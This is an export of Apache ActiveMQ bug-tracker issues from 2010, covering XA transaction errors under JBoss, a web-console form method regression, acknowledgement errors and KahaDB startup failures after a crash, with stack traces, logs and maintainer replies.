So, after step 3 in the test the Camel consumer appears to be connected to the broker, but it does not receive any messages and I get the following warning:

2010-03-27 09:47:02,994 [ActiveMQ Transport: tcp:///127.0.0.1:61616] WARN  org.apache.activemq.ActiveMQSessionExecutor - Received a message on a connection which is not yet started. Have you forgotten to call Connection.start()?

I am attaching a patch to org.apache.activemq.pool.ConnectionPool that does not set started=true if start throws an exception.  This fixes my test program - now each connection retry by camel actually attempts to start the ActiveMQConnection.","Ubuntu Linux 9.10, Sun JDK 1.6.0_15",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Mar/10 15:59;ariekenb;connection_pool_start.patch;https://issues.apache.org/jira/secure/attachment/12461607/connection_pool_start.patch","27/Mar/10 15:58;ariekenb;jmstest.zip;https://issues.apache.org/jira/secure/attachment/12461606/jmstest.zip",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74849,,,Wed Mar 31 11:52:36 UTC 2010,,,,,,,Patch Available,,,,"0|i0rqhb:",159934,,,,,,,,,,,,,,,,,,,,,"27/Mar/10 15:58;ariekenb;Test program showing issue.;;;","27/Mar/10 15:59;ariekenb;Attaching patch.;;;","31/Mar/10 11:52;dejanb;This should be fixed with svn revision 929488. I also added modified test to system tests. Thanks;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Exception sending to an ActiveMQ queue from JBoss in an XA Transaction,AMQ-2676,12483095,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,edwin@finalist.com,edwin@finalist.com,26/Mar/10 13:53,09/Aug/10 15:56,14/Jul/23 05:43,09/Aug/10 15:56,5.3.0,,,,,5.4.0,,,Connector,,,,0,,,,,,,,,"We are trying to use an inbound and outbound queue on a remote ActiveMQ instance using XA transactions.
Receiving seems to work ok, but when we send a message, the ActiveMQ RA gives an exception saying that the session is not 'enlisted to a distributed transaction'.

If we use JBoss Messaging, there is no exception, but the thread on this forum http://community.jboss.org/thread/149573 gives me the impression that JBMQ just works without the transaction in that situation, without throwing an exception.

To work around a classcastexception on the QueueConnectionFactory we use a patched version of the activemq-rar-adapter (see also https://issues.apache.org/activemq/browse/AMQ-2670).

his is the test application & configuration.

To set it up, a regular JBoss 5.1.0-GA can be used (compiled for java 6).

Changes in configuration:
- unzipped activemq-rar (5.3.0), with the new class I wrote as a 'hack'.
The ra.xml is attached to this message, as is the replacement for the jar 

 jbossts-properties.xml - Has the ActiveMQProvider registered for XA recovery purposes

 activemq-jms-ds.xml, must be placed in the deploy folder

Test application:

I commented out the persistence stuff, that is not related to the issue.
The application deploys a MDB and a SLSB. For running the test, you need an ActiveMQ instance on localhost :61616 (default)
To get the error, you can call the SLSB directly (see Test.java, put jboss-all-client.jar on the cp and the ejbjar).
The helloWorld method sends to ActiveMQ.
The sendJBoss method uses a JBoss Messaging Queue (this doesn't give the Exception, but I'm not sure that this means it actually runs in a XA transaction)

To deploy the JBoss queue, you need to add this fragment to the 'deploy/messaging/destinations-service.xml':
  <mbean code=""org.jboss.jms.server.destination.QueueService""
     name=""jboss.messaging.destination:service=Queue,name=DemoQueue""
     xmbean-dd=""xmdesc/Queue-xmbean.xml"">
     <depends optional-attribute-name=""ServerPeer"">jboss.messaging:service=ServerPeer</depends>
     <depends>jboss.messaging:service=PostOffice</depends>
  </mbean>

The rar_performance.ear is the compiled testcase.
To rebuild, unzip the 'simple_ejb_testcase' and perform a mvn install in te 'simple_mdb' folder and in the 'simple_mdb_ear' folder (there is no parent pom.xml).

The exception:
11:56:28,851 ERROR [STDERR] javax.jms.JMSException: Session's XAResource has not been enlisted in a distributed transaction.
11:56:28,852 ERROR [STDERR]     at org.apache.activemq.ActiveMQXASession.doStartTransaction(ActiveMQXASession.java:109)
11:56:28,852 ERROR [STDERR]     at org.apache.activemq.ActiveMQSession.send(ActiveMQSession.java:1636)
11:56:28,852 ERROR [STDERR]     at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:231)
11:56:28,852 ERROR [STDERR]     at org.apache.activemq.ActiveMQMessageProducerSupport.send(ActiveMQMessageProducerSupport.java:241)
11:56:28,852 ERROR [STDERR]     at gts.ise.refdata.domain.complexinstrument.HelloBean.helloWorld(HelloBean.java:46)
11:56:28,852 ERROR [STDERR]     at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
11:56:28,852 ERROR [STDERR]     at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
11:56:28,852 ERROR [STDERR]     at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
11:56:28,852 ERROR [STDERR]     at java.lang.reflect.Method.invoke(Method.java:597)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"26/Mar/10 13:55;edwin@finalist.com;activemq-jms-ds.xml;https://issues.apache.org/jira/secure/attachment/12461636/activemq-jms-ds.xml","26/Mar/10 13:55;edwin@finalist.com;activemq-ra-5.3.0.jar;https://issues.apache.org/jira/secure/attachment/12461635/activemq-ra-5.3.0.jar","26/Mar/10 13:55;edwin@finalist.com;jbossts-properties.xml;https://issues.apache.org/jira/secure/attachment/12461637/jbossts-properties.xml","26/Mar/10 13:56;edwin@finalist.com;ra.xml;https://issues.apache.org/jira/secure/attachment/12461638/ra.xml","26/Mar/10 13:56;edwin@finalist.com;rar_performance.ear;https://issues.apache.org/jira/secure/attachment/12461639/rar_performance.ear","26/Mar/10 13:56;edwin@finalist.com;simpl_ejb_testcase.zip;https://issues.apache.org/jira/secure/attachment/12461640/simpl_ejb_testcase.zip",,,,,,,,,,,,,,,,6.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74850,,,Mon Aug 09 15:56:06 UTC 2010,,,,,,,,,,,"0|i0rqaf:",159903,,,,,,,,,,,,,,,,,,,,,"26/Mar/10 13:59;edwin@finalist.com;Test code (client calling a remote session bean):

public class Test {

   public static void main(String arg[]) throws NamingException {
      Hashtable<String, String> props = new Hashtable<String, String>();

      props.put(""java.naming.factory.initial"", ""org.jnp.interfaces.NamingContextFactory"");
      props.put(""java.naming.factory.url.pkgs"",""org.jboss.naming:org.jnp.interfaces"");
      props.put(""java.naming.provider.url"",""localhost:1099"");
      InitialContext context = new InitialContext(props);
      HelloRemote remote = (HelloRemote) context.lookup(""/rar_performance/HelloBean/remote"");

      remote.helloWorld();
   }
};;;","26/Mar/10 16:29;gtully;with the vanilla 5.3.1 rar, this works fine for me. The rar connection factory is enlisted in the XA transaction. It must be the mods to the rar to support the transaction recovery processing that is problematic.;;;","29/Mar/10 07:26;edwin@finalist.com;Yes, it looks like I was too focused on getting the integration with the recovery manager working.
We should probably remove those changes and find another way to get that part working.;;;","09/Aug/10 15:56;gtully;https://issues.apache.org/activemq/browse/AMQ-2670 sorts this issue out. Please reopen if this is not the case.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
UnsupportedOperationException in web admin when creating topic,AMQ-2675,12483265,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,dejanb,pdudits,pdudits,26/Mar/10 11:33,26/Apr/10 10:57,14/Jul/23 05:43,26/Mar/10 14:30,5.3.1,,,,,5.3.2,5.4.0,,,,,,0,,,,,,,,,"When clicking on ""Create topic"" in web admin, HTTP 500 ""Unsupported method type GET"" error is generated.

looking at diff of commit 915384,  activemq-web-console/src/main/webapp/topics.jsp on line 24 should read method=""post"".",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74851,,,Fri Mar 26 14:30:14 UTC 2010,,,,,,,,,,,"0|i0rr27:",160028,Regression,,,,,,,,,,,,,,,,,,,,"26/Mar/10 14:30;dejanb;Fixed with svn revision 927868. Thanks for spotting.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Producer started before consumer leads to a ""javax.jms.JMSException: Unmatched acknowledege"" (repro available)",AMQ-2673,12483660,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,fredmoore,fredmoore,26/Mar/10 09:54,02/Mar/11 19:51,14/Jul/23 05:43,02/Mar/11 19:51,5.3.0,5.3.1,,,,5.5.0,,,,,,,0,,,,,,,,,"When a Producer is started before a Consumer we get a ""javax.jms.JMSException: Unmatched acknowledege"".

The same application runs fine when a Producer is started after a Consumer.

Attached you will find full repro instruction code and scripts.",windows xp,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"26/Mar/10 09:55;fredmoore;activeMQTest_UnmatchedAcknowledge.zip;https://issues.apache.org/jira/secure/attachment/12461633/activeMQTest_UnmatchedAcknowledge.zip",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,46499,,,Wed Mar 02 19:51:20 UTC 2011,,,,,,,,,,,"0|i0akhr:",59593,,,,,,,,,,,,,,,,,,,,,"26/Mar/10 09:55;fredmoore;Attached you will find full repro instruction code and scripts.
;;;","02/Mar/11 19:51;tabish;Ran the supplied test against the 5.5 SNAPSHOT, no unmatched ack exceptions were produced.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQ failed to start after server crash,AMQ-2672,12482971,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,rajdavies,ruralhunter,ruralhunter,26/Mar/10 03:02,17/Jun/10 11:57,14/Jul/23 05:43,17/May/10 13:33,5.3.0,5.3.1,,,,5.4.0,,,Message Store,,,,0,,,,,,,,,"I'm using kahadb as storage. I have seen this several times, for both 5.3.0 and 5.3.1. If there are many messages in queues and ActiveMQ is not stopped in a correct manner, such as server crash or reboot accidentally, then ActiveMQ can not be started. I have to delete all files in data directory to make it start-able. But this kind of operation causes data loss. Is there anyway to fix that? Here is the log when it fails to start:
2010-03-23 21:28:19,187 | INFO  | ActiveMQ 5.3.1 JMS Message Broker (datacenter) is starting | org.apache.activemq.broker.BrokerService | main
2010-03-23 21:28:19,187 | INFO  | For help or more information please see: http://activemq.apache.org/ | org.apache.activemq.broker.BrokerService | main
2010-03-23 21:28:19,937 | INFO  | Kaha Store using data directory D:\Application\apache-activemq-5.3.1\bin\..\data\datacenter\tmp_storage | org.apache.activemq.kaha.impl.KahaStore | main
2010-03-23 21:28:21,687 | ERROR | Failed to start ActiveMQ JMS Message Broker. Reason: java.lang.NullPointerException | org.apache.activemq.broker.BrokerService | main
java.lang.NullPointerException
        at org.apache.kahadb.index.BTreeNode$BTreeIterator.findNextPage(BTreeNode.java:109)
        at org.apache.kahadb.index.BTreeNode$BTreeIterator.hasNext(BTreeNode.java:120)
        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore$4.execute(KahaDBStore.java:222)
        at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)
        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.recover(KahaDBStore.java:219)
        at org.apache.activemq.broker.region.Queue.initialize(Queue.java:251)
        at org.apache.activemq.broker.region.DestinationFactoryImpl.createDestination(DestinationFactoryImpl.java:83)
        at org.apache.activemq.broker.region.AbstractRegion.createDestination(AbstractRegion.java:464)
        at org.apache.activemq.broker.jmx.ManagedQueueRegion.createDestination(ManagedQueueRegion.java:56)
        at org.apache.activemq.broker.region.AbstractRegion.addDestination(AbstractRegion.java:120)
        at org.apache.activemq.broker.region.RegionBroker.addDestination(RegionBroker.java:268)
        at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:142)
        at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:142)
        at org.apache.activemq.advisory.AdvisoryBroker.addDestination(AdvisoryBroker.java:153)
        at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:142)
        at org.apache.activemq.broker.MutableBrokerFilter.addDestination(MutableBrokerFilter.java:149)
        at org.apache.activemq.broker.region.AbstractRegion.start(AbstractRegion.java:94)
        at org.apache.activemq.broker.region.RegionBroker.start(RegionBroker.java:178)
        at org.apache.activemq.broker.jmx.ManagedRegionBroker.start(ManagedRegionBroker.java:100)
        at org.apache.activemq.broker.TransactionBroker.start(TransactionBroker.java:112)
        at org.apache.activemq.broker.BrokerFilter.start(BrokerFilter.java:154)
        at org.apache.activemq.broker.BrokerFilter.start(BrokerFilter.java:154)
        at org.apache.activemq.broker.BrokerService$3.start(BrokerService.java:1707)
        at org.apache.activemq.broker.BrokerService.start(BrokerService.java:469)
        at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:85)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
        at java.lang.reflect.Method.invoke(Unknown Source)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1414)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1375)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1335)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:473)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409)
        at java.security.AccessController.doPrivileged(Native Method)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380)
        at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:264)
        at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
        at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:261)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:185)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164)
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:429)
        at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:728)
        at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:380)
        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)
        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)
        at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96)
        at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52)
        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)
        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)
        at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)
        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:136)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:82)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
        at java.lang.reflect.Method.invoke(Unknown Source)
        at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
        at org.apache.activemq.console.Main.main(Main.java:107)
2010-03-23 21:28:21,781 | INFO  | ActiveMQ Message Broker (datacenter, null) is shutting down | org.apache.activemq.broker.BrokerService | main
2010-03-23 21:28:21,781 | INFO  | Connector openwire Stopped | org.apache.activemq.broker.TransportConnector | main
2010-03-23 21:28:22,843 | INFO  | ActiveMQ JMS Message Broker (datacenter, null) stopped | org.apache.activemq.broker.BrokerService | main",Windows 2003,rajdavies,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74852,,,Thu Jun 17 11:57:59 UTC 2010,,,,,,,,,,,"0|i0rq73:",159888,,,,,,,,,,,,,,,,,,,,,"26/Mar/10 03:09;ruralhunter;I uploaded the data folder here in case it's needed for investigation: http://rapidshare.com/files/368221874/data.zip.html;;;","29/Mar/10 14:16;rajdavies;I could successfully read the files with trunk - do you have the same problem with 5.4-SNAPSHOT ? ;;;","30/Mar/10 00:57;ruralhunter;I tried 5.4 snapshot. It did start successfully but looks the web admin didn't work. I could see there was no error in log but the port 8161 was just not opened. How can I verify?;;;","30/Mar/10 08:16;dejanb;Hi,

that's strange. Can you verify that you have configured web console and included jetty.xml in your configuration file. Also, can you post startup log, where should be relevant entries about starting the web server and console application.;;;","30/Mar/10 14:47;ruralhunter;This is the startup log:
2010-03-29 23:41:00,062 | INFO  | ActiveMQ JMS Message Broker (datacenter, ID:xuxulike-bca7e5-3933-1269877226406-0:0) stopped | org.apache.activemq.broker.BrokerService | ActiveMQ ShutdownHook
2010-03-29 23:43:37,281 | INFO  | PListStore:D:\Application\apache-activemq-5.4-SNAPSHOT\bin\..\data\datacenter\tmp_storage started | org.apache.activemq.store.kahadb.plist.PListStore | main
2010-03-29 23:43:37,390 | INFO  | Using Persistence Adapter: org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter@186d484 | org.apache.activemq.broker.BrokerService | main
2010-03-29 23:43:38,562 | INFO  | Replayed 1 operations from the journal in 0.031 seconds. | org.apache.activemq.store.kahadb.MessageDatabase | main
2010-03-29 23:43:38,625 | INFO  | ActiveMQ 5.4-SNAPSHOT JMS Message Broker (datacenter) is starting | org.apache.activemq.broker.BrokerService | main
2010-03-29 23:43:38,625 | INFO  | For help or more information please see: http://activemq.apache.org/ | org.apache.activemq.broker.BrokerService | main
2010-03-29 23:43:39,062 | INFO  | Scheduler using directory: activemq-data\scheduler | org.apache.activemq.broker.scheduler.SchedulerBroker | main
2010-03-29 23:43:39,812 | INFO  | Listening for connections at: tcp://xuxulike-bca7e5:62616 | org.apache.activemq.transport.TransportServerThreadSupport | main
2010-03-29 23:43:39,812 | INFO  | Connector openwire Started | org.apache.activemq.broker.TransportConnector | main
2010-03-29 23:43:39,828 | INFO  | ActiveMQ JMS Message Broker (datacenter, ID:xuxulike-bca7e5-1307-1269877418875-0:0) started | org.apache.activemq.broker.BrokerService | main
2010-03-29 23:43:40,000 | INFO  | Logging to org.slf4j.impl.JCLLoggerAdapter(org.eclipse.jetty.util.log) via org.eclipse.jetty.util.log.Slf4jLog | org.eclipse.jetty.util.log | main
2010-03-29 23:43:40,000 | INFO  | jetty-7.0.1.v20091125 | org.eclipse.jetty.util.log | main
2010-03-29 23:43:41,796 | INFO  | ActiveMQ WebConsole initialized. | org.apache.activemq.web.WebConsoleStarter | main
2010-03-29 23:43:42,578 | INFO  | Initializing Spring FrameworkServlet 'dispatcher' | /admin | main
2010-03-29 23:43:43,046 | INFO  | ActiveMQ Console at http://0.0.0.0:8161/admin | org.eclipse.jetty.util.log | main
2010-03-29 23:43:43,687 | INFO  | Initializing Spring root WebApplicationContext | /camel | main
2010-03-29 23:44:40,875 | INFO  | Slow KahaDB access: cleanup took 1688 | org.apache.activemq.store.kahadb.MessageDatabase | ActiveMQ Journal Checkpoint Worker
2010-03-29 23:45:15,312 | INFO  | Slow KahaDB access: cleanup took 797 | org.apache.activemq.store.kahadb.MessageDatabase | ActiveMQ Journal Checkpoint Worker
2010-03-29 23:45:26,578 | INFO  | Slow KahaDB access: cleanup took 1610 | org.apache.activemq.store.kahadb.MessageDatabase | ActiveMQ Journal Checkpoint Worker

The log looks fine for me but I can not even telnet to port 8161. I didn't configure anything for web console and I cann jetty is in conf:
<!-- 
        Enable web consoles, REST and Ajax APIs and demos
        Take a look at activemq-jetty.xml for more details 
    -->
    <import resource=""jetty.xml""/>;;;","31/Mar/10 08:07;dejanb;Hi Rural,

I think you hit a Camel webapp configuration problem introduced lately. You can try the latest snapshot which contains the fix or a workaround documented here: http://cwiki.apache.org/confluence/display/ACTIVEMQ/Web+Console

Please let me know if it works for you.;;;","01/Apr/10 15:09;ruralhunter;I tried the latest snapshot without any modification. Simply download and startup. This time http service on 8161 is open but it's still in error:
HTTP ERROR: 503

Problem accessing /admin/. Reason:

    Service Unavailable

Powered by Jetty://

This is what I can see in the log:
2010-04-01 21:24:20,609 | INFO  | jetty-7.0.1.v20091125 | org.eclipse.jetty.util.log | main
2010-04-01 21:24:21,187 | INFO  | ActiveMQ WebConsole initialized. | org.apache.activemq.web.WebConsoleStarter | main
2010-04-01 21:24:21,593 | INFO  | Initializing Spring FrameworkServlet 'dispatcher' | /admin | main
2010-04-01 21:24:21,937 | INFO  | ActiveMQ Console at http://0.0.0.0:8161/admin | org.eclipse.jetty.util.log | main
2010-04-01 21:24:22,171 | INFO  | Initializing Spring root WebApplicationContext | /camel | main
2010-04-01 21:24:24,484 | ERROR | Context initialization failed | org.springframework.web.context.ContextLoader | main
org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'activemq' defined in ServletContext resource [/WEB-INF/applicationContext.xml]: Cannot create inner bean 'org.apache.activemq.ActiveMQConnectionFactory#1e6978d' of type [org.apache.activemq.ActiveMQConnectionFactory] while setting bean property 'connectionFactory'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.ActiveMQConnectionFactory#1e6978d' defined in ServletContext resource [/WEB-INF/applicationContext.xml]: Error setting property values; nested exception is org.springframework.beans.NotWritablePropertyException: Invalid property 'useSingleConnection' of bean class [org.apache.activemq.ActiveMQConnectionFactory]: Bean property 'useSingleConnection' is not writable or has an invalid setter method. Does the parameter type of the setter match the return type of the getter?
	at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveInnerBean(BeanDefinitionValueResolver.java:281)
	at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveValueIfNecessary(BeanDefinitionValueResolver.java:120)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1308)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1067)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:511)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:450)
	at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:290)
	at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
	at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:287)
	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:189)
	at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:562)
	at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:871)
	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:423)
	at org.springframework.web.context.ContextLoader.createWebApplicationContext(ContextLoader.java:272)
	at org.springframework.web.context.ContextLoader.initWebApplicationContext(ContextLoader.java:196)
	at org.springframework.web.context.ContextLoaderListener.contextInitialized(ContextLoaderListener.java:47)
	at org.eclipse.jetty.server.handler.ContextHandler.startContext(ContextHandler.java:645)
	at org.eclipse.jetty.servlet.ServletContextHandler.startContext(ServletContextHandler.java:189)
	at org.eclipse.jetty.webapp.WebAppContext.startContext(WebAppContext.java:978)
	at org.eclipse.jetty.server.handler.ContextHandler.doStart(ContextHandler.java:586)
	at org.eclipse.jetty.webapp.WebAppContext.doStart(WebAppContext.java:349)
	at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:55)
	at org.eclipse.jetty.server.handler.HandlerCollection.doStart(HandlerCollection.java:165)
	at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:55)
	at org.eclipse.jetty.server.handler.HandlerWrapper.doStart(HandlerWrapper.java:92)
	at org.eclipse.jetty.server.Server.doStart(Server.java:228)
	at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:55)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1527)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1468)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1400)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:513)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:450)
	at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:290)
	at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
	at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:287)
	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:189)
	at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:562)
	at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:871)
	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:423)
	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)
	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)
	at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96)
	at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)
	at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)
	at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)
	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
	at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:136)
	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
	at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:82)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
